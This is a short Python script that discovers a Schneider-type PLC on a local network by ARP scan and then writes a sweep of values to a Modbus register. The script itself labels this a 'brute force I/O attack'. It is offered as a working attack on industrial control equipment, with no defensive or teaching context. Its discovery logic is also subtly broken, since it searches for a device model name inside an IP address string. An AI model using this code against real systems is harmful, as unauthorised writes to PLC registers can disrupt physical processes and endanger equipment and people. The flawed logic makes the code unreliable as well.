import socket
import time
from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the target IP range (e.g., 192.168.1.0/24)
    target_ip = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=2, verbose=False)[0]
    
    # Parse the response to find the PLC's IP address
    for sent, received in result:
        if "TM221CE16R" in received.psrc:  # Assuming the PLC has a specific hostname or MAC address
            return received.psrc
    
    return None

# Function to perform brute force I/O attack
def brute_force_io(plc_ip, io_point, start_value, end_value, step, delay):
    client = ModbusTcpClient(plc_ip)
    
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    
    try:
        for value in range(start_value, end_value + 1, step):
            # Write the value to the specified I/O point
            result = client.write_register(io_point, value)
            if result.isError():
                print(f"Failed to write value {value} to I/O point {io_point}")
            else:
                print(f"Successfully wrote value {value} to I/O point {io_point}")
            
            # Wait for the specified delay
            time.sleep(delay)
    finally:
        client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("PLC not found in the network.")
        return
    
    print(f"PLC found at IP address: {plc_ip}")
    
    # Define the I/O point and brute force parameters
    io_point = 0x0001  # Example I/O point (register address)
    start_value = 0
    end_value = 100
    step = 1
    delay = 1  # Delay in seconds between each write
    
    # Perform the brute force I/O attack
    brute_force_io(plc_ip, io_point, start_value, end_value, step, delay)

if __name__ == "__main__":
    main()